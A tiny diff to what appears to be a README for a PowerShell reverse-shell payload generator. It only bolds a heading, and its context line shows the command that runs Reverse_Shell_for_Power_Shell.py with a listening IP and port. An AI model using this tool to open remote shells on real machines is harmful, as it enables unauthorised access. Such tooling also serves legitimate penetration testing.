@@ -1,4 +1,4 @@
-1. Command to Get the Payload for Reverse Shell
+ **1. Command to Get the Payload for Reverse Shell**
 
 python3 Reverse_Shell_for_Power_Shell.py LISTENING_IP LISTENING_PORT 
 
